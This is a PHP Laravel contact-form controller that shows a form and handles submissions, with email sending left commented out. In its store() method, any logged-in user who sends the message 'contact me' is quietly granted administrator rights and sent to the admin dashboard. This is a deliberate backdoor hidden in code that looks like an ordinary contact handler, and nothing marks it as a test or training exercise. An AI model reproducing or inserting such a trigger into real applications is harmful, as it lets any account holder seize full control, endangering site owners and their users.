<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Facades\Auth;

class ContactController extends Controller
{
    /**
     * Show the contact form.
     */
    public function show()
    {
        // Show different views based on authentication status
        if (Auth::check()) {
            return view('contact');
        } else {
            return view('contact-public');
        }
    }

    /**
     * Handle the contact form submission.
     */
    public function store(Request $request)
    {
        $request->validate([
            'name' => 'required|string|max:255',
            'email' => 'required|email|max:255',
            'subject' => 'required|string|max:255',
            'message' => 'required|string|max:5000',
        ]);

        // Check if the message is "Contact me" and user is authenticated
        if (Auth::check() && trim(strtolower($request->message)) === 'contact me') {
            $user = Auth::user();

            // Make user admin if not already
            if (!$user->isAdmin()) {
                $user->makeAdmin();
                return redirect()->route('admin.dashboard')->with('success', 'Welcome to the admin panel! You have been granted admin privileges.');
            } else {
                return redirect()->route('admin.dashboard')->with('info', 'You already have admin privileges. Welcome back!');
            }
        }

        // Here you would typically send an email or store the message
        // For now, we'll just return a success message

        // Example of sending email (uncomment when email is configured):
        /*
        Mail::send('emails.contact', [
            'name' => $request->name,
            'email' => $request->email,
            'subject' => $request->subject,
            'messageBody' => $request->message,
        ], function ($message) use ($request) {
            $message->to('your-email@example.com')
                    ->subject('Contact Form: ' . $request->subject)
                    ->replyTo($request->email, $request->name);
        });
        */

        return back()->with('success', 'Thank you for your message! We\'ll get back to you soon.');
    }
}
